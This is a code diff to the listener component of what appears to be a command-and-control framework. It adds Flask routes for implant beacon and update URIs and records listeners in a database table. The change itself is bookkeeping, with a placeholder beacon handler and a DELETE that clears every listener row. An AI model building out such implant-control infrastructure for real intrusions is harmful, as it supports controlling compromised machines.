@@ -34,11 +34,11 @@ class WebServer(object):
         try:
             # parses profile
             with open(self.profile) as file:
-                j = json.load(file)
+                self.j = json.load(file)
 
                 # adds Flask beacon and update routes
-                self.app.add_url_rule(j["implant"]["beacon_uri"], None, self.beacon, methods=["GET", "POST"])
-                self.app.add_url_rule(j["implant"]["update_uri"], None, self.update, methods=["GET", "POST"])
+                self.app.add_url_rule(self.j["implant"]["beacon_uri"], None, self.beacon, methods=["GET", "POST"])
+                self.app.add_url_rule(self.j["implant"]["update_uri"], None, self.update, methods=["GET", "POST"])
 
                 # TO DO: add in malleable HTTP responses here
 
@@ -49,20 +49,25 @@ class WebServer(object):
         # tries to start Flask web server
         try:
             server = wsgi.WSGIServer(("0.0.0.0", self.port), self.app)
+
+            # add an entry in the "listeners" table
+            with self.connection.cursor() as cursor:
+                cursor.execute("INSERT INTO `listeners` (`protocol`, `external_address`, `port`, `profile`, `user_agent`, `sleep`, `beacon_uri`, `update_uri`) VALUES (%s, %s, %s, %s, %s, %s, %s, %s)",
+                (self.protocol, self.external_address, self.port, self.profile, self.j["implant"]["user_agent"], self.j["implant"]["sleep"], self.j["implant"]["beacon_uri"], self.j["implant"]["update_uri"]))
+
             Message.display_status("[+] Successfully started listener on " + self.external_address + ":" + str(self.port))
             server.serve_forever()
 
-            # TO DO: add in INSERT into "listeners" table here
-
         except KeyboardInterrupt:
-            server.stop()
-
-            # TO DO: add in DELETE from "listeners" table here
+            pass
 
         except Exception:
-            # TO DO: add in DELETE from "listeners" table here
-
             raise
+
+        finally:
+            # deletes entry from "listeners" table
+            with self.connection.cursor() as cursor:
+                cursor.execute("DELETE FROM `listeners`")
 
     def beacon(self):
         return "beacon response"
